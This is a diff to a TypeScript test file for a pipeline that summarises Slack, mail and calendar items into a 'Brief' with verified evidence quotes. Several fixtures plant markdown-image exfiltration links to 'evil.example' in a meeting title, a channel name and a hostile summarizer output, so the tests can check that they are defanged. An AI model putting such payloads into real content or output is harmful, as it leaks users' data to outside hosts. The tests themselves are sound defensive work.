@@ -1,10 +1,12 @@
 import { test, expect, describe } from "bun:test";
-import { untrusted, unwrap } from "../src/trust.ts";
-import type { Bundle, CalendarEvent, Email } from "../src/domain.ts";
+import { untrusted } from "../src/trust.ts";
+import type { AnnotatedItem, Bucket, Bundle, CalendarEvent, ChatMessage, Email } from "../src/domain.ts";
 import {
   calendarEventRecord,
+  chatMessageRecord,
   emailRecord,
   type CalendarEventSpec,
+  type ChatMessageSpec,
   type EmailSpec,
 } from "../src/sources/normalize.ts";
 import { plan, renderBundle, type PlanDeps } from "../src/plan.ts";
@@ -43,82 +45,70 @@ function bundle(items: Bundle["items"]): Bundle {
   return { window, sources: [{ source: "graph", itemCount: items.length }], items };
 }
 
-const item = {
-  source: "graph",
-  kind: "event",
-  timestamp: "2026-07-07T09:00:00Z",
-  bucket: "recent",
-  id: untrusted("1"),
-  title: untrusted("Board meeting"),
-} as const;
+/** A Slack message record in a channel, written by Ada, as the Slack source builds it. */
+function chat(over: Partial<ChatMessageSpec> = {}, bucket: Bucket = "recent"): ChatMessage & { bucket: Bucket } {
+  const record = chatMessageRecord({
+    channelId: "C1",
+    ts: "1783414800.000100",
+    at: "2026-07-07T09:00:00Z",
+    conversation: { kind: "channel", isExternal: false, name: "flow-mgmt" },
+    author: { name: "Ada Lovelace", handle: "U2", isMe: false },
+    mentionsMe: true,
+    text: "Board meeting",
+    ...over,
+  });
+  return { ...record, bucket };
+}
+
+/** An inbox mail record, as the Graph source builds it. */
+function mailRecord(over: Partial<EmailSpec> = {}, bucket: Bucket = "recent"): Email & { bucket: Bucket } {
+  const record = emailRecord({
+    id: "m1",
+    continuesFromBefore: false,
+    at: "2026-07-07T11:00:00Z",
+    folder: "inbox",
+    subject: "Status",
+    from: { name: "Kari Nord", handle: "kari@x.test", isMe: false },
+    to: [],
+    cc: [],
+    body: "",
+    importance: "normal",
+    isRead: true,
+    flagged: false,
+    hasAttachments: false,
+    inferenceClassification: "focused",
+    ...over,
+  });
+  return { ...record, bucket };
+}
+
+const item = chat();
 
 describe("renderBundle", () => {
   test("groups by bucket and unwraps untrusted fields", () => {
-    const rendered = renderText(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T09:00:00Z",
-          bucket: "recent",
-          id: untrusted("1"),
-          title: untrusted("Board meeting"),
-          extras: untrusted({ organizer: "Anna", attendees: ["Bo", "Cy"] }),
-        },
-      ]),
-    );
+    const rendered = renderText(bundle([chat({ text: "Board meeting" })]));
     expect(rendered).toContain("RECENT");
     expect(rendered).toContain("title: Board meeting");
-    expect(rendered).toContain("organizer: Anna");
-    expect(rendered).toContain("attendees: Bo, Cy");
+    expect(rendered).toContain("author: Ada Lovelace");
   });
 });
 
 describe("renderBundle — length caps", () => {
   test("truncates an oversized rendered field with a visible marker at 2,000 chars", () => {
-    const oversizedTitle = "x".repeat(2_500);
-    const rendered = renderText(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T09:00:00Z",
-          bucket: "recent",
-          id: untrusted("4"),
-          title: untrusted(oversizedTitle),
-          url: untrusted(`https://example.test/${"y".repeat(2_500)}`),
-          extras: untrusted({ body: "z".repeat(2_500) }),
-        },
-      ]),
-    );
+    // Built past the record builder's own cap, so the render-time cap is what is tested.
+    const oversized: AnnotatedItem = { ...chat(), text: untrusted("x".repeat(2_500)) };
+    const rendered = renderText(bundle([oversized]));
 
     expect(rendered).toContain("…[truncated]");
     // title line: "  title: " + 2000 x's + marker, nothing beyond.
     const titleLine = rendered.split("\n").find((l) => l.startsWith("  title:"))!;
     expect(titleLine).toBe(`  title: ${"x".repeat(2_000)}…[truncated]`);
     expect(rendered).not.toContain("x".repeat(2_001));
-
-    const urlLine = rendered.split("\n").find((l) => l.startsWith("  url:"))!;
-    expect(urlLine.endsWith("…[truncated]")).toBe(true);
-
-    const bodyLine = rendered.split("\n").find((l) => l.startsWith("  body:"))!;
-    expect(bodyLine.endsWith("…[truncated]")).toBe(true);
   });
 
   test("leaves a field at or under the cap untouched", () => {
     const title = "x".repeat(2_000);
-    const rendered = renderText(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T09:00:00Z",
-          bucket: "recent",
-          id: untrusted("5"),
-          title: untrusted(title),
-        },
-      ]),
-    );
+    const rendered = renderText(bundle([{ ...chat(), text: untrusted(title) }]));
     expect(rendered).toContain(`  title: ${title}`);
     expect(rendered).not.toContain("…[truncated]");
   });
@@ -136,20 +126,7 @@ describe("plan", () => {
 
   test("attaches the trusted envelope and the Summarizer's output", async () => {
     const { summarize } = fakeSummarizer();
-    const brief = await plan(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T09:00:00Z",
-          bucket: "recent",
-          id: untrusted("1"),
-          title: untrusted("Board meeting"),
-        },
-      ]),
-      CTX,
-      { summarize },
-    );
+    const brief = await plan(bundle([item]), CTX, { summarize });
     expect(brief.envelope.window).toEqual(window);
     expect(brief.envelope.timezone).toBe("UTC");
     expect(brief.summary).toContain("meeting");
@@ -189,14 +166,7 @@ describe("plan — defang transform", () => {
   // must survive evidence-quote verification once that lands, not just the
   // defang transform). This models a real hostile source, e.g. a meeting title
   // crafted for render-time exfiltration — not a fabricated quote.
-  const hostileItem = {
-    source: "graph",
-    kind: "event",
-    timestamp: "2026-07-07T09:00:00Z",
-    bucket: "recent",
-    id: untrusted("2"),
-    title: untrusted("click here ![img](https://evil.example/?q=quote)"),
-  } as const;
+  const hostileItem = chat({ text: "click here ![img](https://evil.example/?q=quote)" });
 
   // A hostile summarizer output carrying markdown image/link exfiltration vectors
   // and bare URLs in every string field. `plan()` must defang all of it before the
@@ -266,14 +236,7 @@ describe("plan — defang transform", () => {
 describe("plan — evidence-quote verification", () => {
   // A title with irregular internal spacing so a line-wrapped quote (below) still
   // matches after whitespace normalization.
-  const verifyItem = {
-    source: "graph",
-    kind: "event",
-    timestamp: "2026-07-07T09:00:00Z",
-    bucket: "recent",
-    id: untrusted("3"),
-    title: untrusted("Board meeting for Q3 planning"),
-  } as const;
+  const verifyItem = chat({ text: "Board meeting for Q3 planning" });
 
   test("drops a fabricated quote but keeps a verbatim quote and a whitespace-wrapped honest quote", async () => {
     const output: SummarizerOutput = {
@@ -311,24 +274,13 @@ describe("plan — evidence-quote verification", () => {
   // citing the wrong item is dropped rather than passing. The pay-off is that a
   // surviving quote and its code-copied attribution cannot disagree.
   describe("resolves each quote against the item it cites, not the whole bundle", () => {
-    const first = {
-      source: "slack",
-      kind: "message",
-      timestamp: "2026-07-07T09:00:00Z",
-      bucket: "recent",
-      id: untrusted("m1"),
-      title: untrusted("Sounds good, I'll take a look this afternoon"),
-      attribution: untrusted({ where: "#flow-mgmt", who: ["Ada Lovelace"], relationship: "mentions" }),
-    } as const;
-    const second = {
-      source: "graph",
-      kind: "message",
-      timestamp: "2026-07-07T11:00:00Z",
-      bucket: "recent",
-      id: untrusted("m2"),
-      title: untrusted("Q3 budget figures — need your numbers by Friday"),
-      attribution: untrusted({ where: "Inbox", who: ["Kari Nord"] }),
-    } as const;
+    const first = chat({ text: "Sounds good, I'll take a look this afternoon" });
+    const second = mailRecord({
+      id: "m2",
+      at: "2026-07-07T11:00:00Z",
+      subject: "Q3 budget figures — need your numbers by Friday",
+      from: { name: "Kari Nord", handle: "kari@x.test", isMe: false },
+    });
 
     test("copies the cited item's attribution and code-fills source", async () => {
       const output: SummarizerOutput = {
@@ -347,6 +299,7 @@ describe("plan — evidence-quote verification", () => {
       expect(brief.items[0]!.evidence).toEqual([
         {
           source: "slack/message",
+          fingerprint: first.fingerprint,
           where: "#flow-mgmt",
           who: ["Ada Lovelace"],
           relationship: "mentions",
@@ -358,26 +311,19 @@ describe("plan — evidence-quote verification", () => {
     // #94: a DM's `where` and `who` read the same both ways, so without the
     // relationship a consumer attributes the user's own words to the counterpart.
     test("copies the item's relationship, so two entries from one DM differ by direction", async () => {
-      const dm = {
-        source: "slack",
-        kind: "message",
-        timestamp: "2026-07-07T09:00:00Z",
-        bucket: "recent",
-        id: untrusted("d1"),
-        title: untrusted("Can you look at the deploy?"),
-        attribution: untrusted({ where: "DM with Alice", who: ["Alice"], relationship: "dms" }),
-      } as const;
-      const reply = {
-        ...dm,
-        id: untrusted("d2"),
-        timestamp: "2026-07-07T09:05:00Z",
-        title: untrusted("Yes, on it after lunch"),
-        attribution: untrusted({
-          where: "DM with Alice",
-          who: ["Alice"],
-          relationship: "authored",
-        }),
-      };
+      const alice = { name: "Alice", handle: "U3", isMe: false };
+      const me = { name: "Me", handle: "U1", isMe: true };
+      const conversation = { kind: "dm" as const, isExternal: false, members: [alice] };
+      const dm = chat({ channelId: "D1", conversation, author: alice, mentionsMe: false, text: "Can you look at the deploy?" });
+      const reply = chat({
+        channelId: "D1",
+        ts: "1783415100.000100",
+        at: "2026-07-07T09:05:00Z",
+        conversation,
+        author: me,
+        mentionsMe: false,
+        text: "Yes, on it after lunch",
+      });
       const output: SummarizerOutput = {
         summary: "s",
         items: [
@@ -395,49 +341,13 @@ describe("plan — evidence-quote verification", () => {
       const brief = await plan(bundle([dm, reply]), CTX, { summarize });
 
       const [incoming, outgoing] = brief.items[0]!.evidence;
+      expect(incoming!.where).toBe("DM with Alice");
+      expect(outgoing!.where).toBe("DM with Alice");
+      expect(incoming!.who).toEqual(["Alice"]);
+      expect(outgoing!.who).toEqual(["Alice"]);
       expect(incoming!.relationship).toBe("dms");
       expect(outgoing!.relationship).toBe("authored");
       expect(incoming).not.toEqual(outgoing!);
-    });
-
-    // The Planner copies whatever the source put on the Attribution, so the tracker
-    // vocabulary reaches the Brief through the same line as Slack's (#94, story 7).
-    test("carries a tracker relationship through for a Linear-shaped item", async () => {
-      const issue = {
-        source: "linear",
-        kind: "issue",
-        timestamp: "2026-07-07T09:00:00Z",
-        bucket: "recent",
-        id: untrusted("OYV-111"),
-        title: untrusted("Self-update the compiled binary"),
-        attribution: untrusted({
-          where: "Rundown",
-          who: ["Ada Lovelace"],
-          relationship: "assigned",
-        }),
-      } as const;
-      const output: SummarizerOutput = {
-        summary: "s",
-        items: [
-          {
-            kind: "task",
-            summary: "Self-update",
-            evidence: [{ ref: 1, quote: "Self-update the compiled binary" }],
-          },
-        ],
-      };
-      const { summarize } = fakeSummarizer(output);
-      const brief = await plan(bundle([issue]), CTX, { summarize });
-
-      expect(brief.items[0]!.evidence).toEqual([
-        {
-          source: "linear/issue",
-          where: "Rundown",
-          who: ["Ada Lovelace"],
-          relationship: "assigned",
-          quote: "Self-update the compiled binary",
-        },
-      ]);
     });
 
     test("omits the field entirely for an item whose attribution has no relationship", async () => {
@@ -459,14 +369,15 @@ describe("plan — evidence-quote verification", () => {
       expect(Object.keys(entry)).not.toContain("relationship");
     });
 
-    test("defangs and truncates a hostile relationship like the other labels", async () => {
-      const hostile = {
-        ...first,
-        attribution: untrusted({
-          where: "#flow-mgmt",
-          relationship: `![](https://evil.example/?q=rel) ${"r".repeat(150)}`,
-        }),
-      };
+    test("defangs and truncates a hostile channel name like the other labels", async () => {
+      const hostile = chat({
+        conversation: {
+          kind: "channel",
+          isExternal: false,
+          name: `![](https://evil.example/?q=where)${"w".repeat(150)}`,
+        },
+        text: "Sounds good, I'll take a look this afternoon",
+      });
       const output: SummarizerOutput = {
         summary: "s",
         items: [
@@ -480,25 +391,23 @@ describe("plan — evidence-quote verification", () => {
       const { summarize } = fakeSummarizer(output);
       const brief = await plan(bundle([hostile]), CTX, { summarize });
 
-      const relationship = brief.items[0]!.evidence[0]!.relationship!;
-      expect(relationship).not.toContain("https://");
-      expect(relationship).not.toContain("![");
+      const where = brief.items[0]!.evidence[0]!.where!;
+      expect(where).not.toContain("https://");
+      expect(where).not.toContain("![");
       // Clamped as it is filled, before the defang transform shortens it further.
-      expect(relationship.length).toBeLessThanOrEqual(120);
-      expect(relationship.trimEnd().endsWith("r")).toBe(true);
+      expect(where.length).toBeLessThanOrEqual(120);
+      expect(where.trimEnd().endsWith("w")).toBe(true);
     });
 
     // #86: a large meeting used to kill the whole run — the code-filled `who` exceeded
     // the contract's cap and the final parse threw after the model call was spent.
     // Attribution is now clamped as it is filled, so the Brief survives.
     test("clamps an oversized who list to the contract cap instead of throwing", async () => {
-      const crowded = {
-        ...first,
-        attribution: untrusted({
-          where: "#flow-mgmt",
-          who: Array.from({ length: 20 }, (_, i) => `Person ${i + 1}`),
-        }),
-      };
+      const crowded = mailRecord({
+        subject: "All-hands: take a look this afternoon",
+        from: { name: "Person 1", handle: "p1@x.test", isMe: false },
+        to: Array.from({ length: 19 }, (_, i) => ({ name: `Person ${i + 2}`, handle: `p${i + 2}@x.test`, isMe: false })),
+      });
       const output: SummarizerOutput = {
         summary: "s",
         items: [
@@ -521,10 +430,11 @@ describe("plan — evidence-quote verification", () => {
 
     test("truncates an over-long name and where label to the label cap", async () => {
       const longName = "N".repeat(150);
-      const wordy = {
-        ...first,
-        attribution: untrusted({ where: "W".repeat(150), who: [longName] }),
-      };
+      const wordy = chat({
+        conversation: { kind: "channel", isExternal: false, name: "W".repeat(150) },
+        author: { name: longName, handle: "U2", isMe: false },
+        text: "Sounds good, I'll take a look this afternoon",
+      });
       const output: SummarizerOutput = {
         summary: "s",
         items: [
@@ -540,7 +450,8 @@ describe("plan — evidence-quote verification", () => {
 
       const entry = brief.items[0]!.evidence[0]!;
       expect(entry.who).toEqual(["N".repeat(120)]);
-      expect(entry.where).toBe("W".repeat(120));
+      // `#` plus the name, clamped to the label cap.
+      expect(entry.where).toBe(`#${"W".repeat(119)}`);
     });
 
     test("drops a real quote that cites the wrong item (the behaviour change)", async () => {
@@ -584,8 +495,14 @@ describe("plan — evidence-quote verification", () => {
       expect(brief.items[0]!.evidence).toEqual([]);
     });
 
-    test("omits where/who when the cited item carries no attribution", async () => {
-      const bare = { ...first, attribution: undefined };
+    test("omits where and who when a DM has no readable counterpart and the user wrote it", async () => {
+      const bare = chat({
+        channelId: "D1",
+        conversation: { kind: "dm", isExternal: false, members: [] },
+        author: { name: "Me", handle: "U1", isMe: true },
+        mentionsMe: false,
+        text: "Sounds good",
+      });
       const output: SummarizerOutput = {
         summary: "s",
         items: [{ kind: "fyi", summary: "x", evidence: [{ ref: 1, quote: "Sounds good" }] }],
@@ -593,13 +510,15 @@ describe("plan — evidence-quote verification", () => {
       const { summarize } = fakeSummarizer(output);
       const brief = await plan(bundle([bare]), CTX, { summarize });
 
-      expect(brief.items[0]!.evidence).toEqual([{ source: "slack/message", quote: "Sounds good" }]);
+      expect(brief.items[0]!.evidence).toEqual([
+        { source: "slack/message", fingerprint: bare.fingerprint, relationship: "authored", quote: "Sounds good" },
+      ]);
     });
 
     // Refs are assigned in render order across the whole bundle, and the bundle renders
     // standing → recent → upcoming — so numbering crosses bucket-section boundaries.
     test("numbers items across buckets in render order, not per bucket", async () => {
-      const standing = { ...second, bucket: "standing" as const, title: untrusted("Standing item") };
+      const standing = { ...mailRecord({ subject: "Standing item" }), bucket: "standing" as const };
       const rendered = renderBundle(bundle([first, standing]), "UTC");
       expect(rendered.data).toContain("- [1] [graph/message]"); // standing renders first
       expect(rendered.data).toContain("- [2] [slack/message]");
@@ -617,86 +536,13 @@ describe("plan — evidence-quote verification", () => {
 
 describe("renderBundle — timezone (#106)", () => {
   test("renders instants as local wall time with an explicit offset, and names the zone", () => {
-    const rendered = renderBundle(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T08:00:00Z",
-          end: "2026-07-07T09:00:00Z",
-          bucket: "recent",
-          id: untrusted("1"),
-          title: untrusted("Board meeting"),
-        },
-      ]),
-      "Europe/Oslo",
-    ).data;
-    expect(rendered).toContain("Tue 2026-07-07T10:00:00+02:00 – 2026-07-07T11:00:00+02:00");
+    const rendered = renderBundle(bundle([chat({ at: "2026-07-07T08:00:00Z" })]), "Europe/Oslo").data;
+    expect(rendered).toContain("Tue 2026-07-07T10:00:00+02:00");
     expect(rendered).toContain("(times shown in Europe/Oslo)");
     // The window line is zoned too.
     expect(rendered).toContain("Window: 2026-07-06T02:00:00+02:00 to 2026-07-13T02:00:00+02:00");
   });
-
-  test("a date-only item renders as its UTC calendar date, not an offset-shifted instant", () => {
-    const rendered = renderBundle(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T00:00:00Z",
-          end: "2026-07-08T00:00:00Z",
-          dateOnly: true,
-          bucket: "recent",
-          id: untrusted("1"),
-          title: untrusted("Offsite"),
-        },
-      ]),
-      // Negative offset is the hazard: naive conversion would land on 2026-07-06.
-      "America/New_York",
-    ).data;
-    expect(rendered).toContain("Tue 2026-07-07");
-    expect(rendered).not.toContain("2026-07-06");
-    expect(rendered).not.toContain("2026-07-07T");
-  });
-
-  test("a multi-day date-only item renders an inclusive date range", () => {
-    const rendered = renderBundle(
-      bundle([
-        {
-          source: "graph",
-          kind: "event",
-          timestamp: "2026-07-07T00:00:00Z",
-          end: "2026-07-10T00:00:00Z", // exclusive bound → last day is the 9th
-          dateOnly: true,
-          bucket: "recent",
-          id: untrusted("1"),
-          title: untrusted("Conference"),
-        },
-      ]),
-      "Europe/Oslo",
-    ).data;
-    expect(rendered).toContain("Tue 2026-07-07 – Thu 2026-07-09");
-  });
-
-  test("a due-date anchor renders as its calendar date in a positive-offset zone", () => {
-    const rendered = renderBundle(
-      bundle([
-        {
-          source: "linear",
-          kind: "issue",
-          timestamp: "2026-07-10T23:59:59Z", // synthetic end-of-day due-date anchor
-          dateOnly: true,
-          bucket: "upcoming",
-          id: untrusted("1"),
-          title: untrusted("Ship the report"),
-        },
-      ]),
-      // Positive offset is the hazard here: naive conversion would land on Sat the 11th.
-      "Europe/Oslo",
-    ).data;
-    expect(rendered).toContain("Fri 2026-07-10");
-    expect(rendered).not.toContain("2026-07-11");
-  });
+  // Date-only rendering is covered by the all-day event test under #148 below.
 });
 
 describe("plan — evidence fingerprint (#108)", () => {
@@ -711,28 +557,86 @@ describe("plan — evidence fingerprint (#108)", () => {
     ],
   };
 
-  test("copies the cited item's fingerprint into the resolved entry, stable across runs", async () => {
-    const fingerprinted = { ...item, fingerprint: "0123456789abcdef" };
-    const first = await plan(bundle([fingerprinted]), CTX, fakeSummarizer(output));
-    const second = await plan(bundle([fingerprinted]), CTX, fakeSummarizer(output));
-    expect(first.items[0]!.evidence[0]!.fingerprint).toBe("0123456789abcdef");
+  test("copies the cited record's fingerprint into the resolved entry, stable across runs", async () => {
+    const first = await plan(bundle([chat()]), CTX, fakeSummarizer(output));
+    const second = await plan(bundle([chat()]), CTX, fakeSummarizer(output));
+    expect(first.items[0]!.evidence[0]!.fingerprint).toBe(item.fingerprint);
     // The dedup contract: same source item in two Briefs → equal fingerprints.
-    expect(second.items[0]!.evidence[0]!.fingerprint).toBe(
-      first.items[0]!.evidence[0]!.fingerprint!,
-    );
-  });
-
-  test("omits the field when the cited item has no fingerprint", async () => {
-    const brief = await plan(bundle([item]), CTX, fakeSummarizer(output));
-    expect(brief.items[0]!.evidence[0]!.fingerprint).toBeUndefined();
-    expect("fingerprint" in brief.items[0]!.evidence[0]!).toBe(false);
+    expect(second.items[0]!.evidence[0]!.fingerprint).toBe(first.items[0]!.evidence[0]!.fingerprint!);
   });
 
   test("the model cannot supply a fingerprint — it is not in the Summarizer's schema", async () => {
     const { summarize, calls } = fakeSummarizer(output);
-    await plan(bundle([{ ...item, fingerprint: "0123456789abcdef" }]), CTX, { summarize });
+    await plan(bundle([item]), CTX, { summarize });
     // Never rendered to the model either: the digest is not in the bundle data.
-    expect(calls[0]!.data).not.toContain("0123456789abcdef");
+    expect(calls[0]!.data).not.toContain(item.fingerprint);
+  });
+});
+
+// ── Slack as typed ChatMessage records (#149) ──
+//
+// Until the Digester replaces the Planner, the Brief renders and cites a ChatMessage as
+// it did the old Slack `message` item. The url line and the query family go, and the
+// conversation's entryKey digest stands in for the channel id.
+
+describe("plan — Slack as ChatMessage records (#149)", () => {
+  test("renders a channel message as a slack/message item with its old lines", () => {
+    const record = chat({ text: "hi @Me" });
+    const rendered = renderText(bundle([record]));
+    expect(rendered).toContain("- [1] [slack/message] Tue 2026-07-07T09:00:00Z");
+    for (const line of [
+      "  title: hi @Me",
+      "  where: #flow-mgmt",
+      "  who: Ada Lovelace",
+      "  relationship: mentions",
+      `  channel: {"id":"${record.entryKey}","name":"flow-mgmt","type":"channel"}`,
+      "  author: Ada Lovelace",
+    ]) {
+      expect(rendered).toContain(line);
+    }
+    expect(rendered).not.toContain("url:");
+    expect(rendered).not.toContain("C1");
+    expect(rendered).not.toContain("U2");
+  });
+
+  test("labels my DM with the counterpart and marks it authored", () => {
+    const rendered = renderText(
+      bundle([
+        chat({
+          channelId: "D1",
+          conversation: { kind: "dm", isExternal: true, members: [{ name: "Bent Hansen", handle: "U9", isMe: false }] },
+          author: { name: "Me", handle: "U1", isMe: true },
+          mentionsMe: false,
+          text: "on it",
+        }),
+      ]),
+    );
+    for (const line of [
+      "  where: DM with Bent Hansen",
+      "  who: Bent Hansen",
+      "  relationship: authored",
+      "  counterpart: Bent Hansen",
+      "  fromMe: true",
+      "  external: true",
+    ]) {
+      expect(rendered).toContain(line);
+    }
+  });
+
+  test("labels a group DM generically and an empty message as having no text", () => {
+    const rendered = renderText(
+      bundle([
+        chat({
+          channelId: "G1",
+          conversation: { kind: "group_dm", isExternal: false, members: [] },
+          mentionsMe: false,
+          text: "",
+        }),
+      ]),
+    );
+    expect(rendered).toContain("  title: (no message text)");
+    expect(rendered).toContain("  where: Group DM");
+    expect(rendered).toContain("  relationship: dms");
   });
 });
 
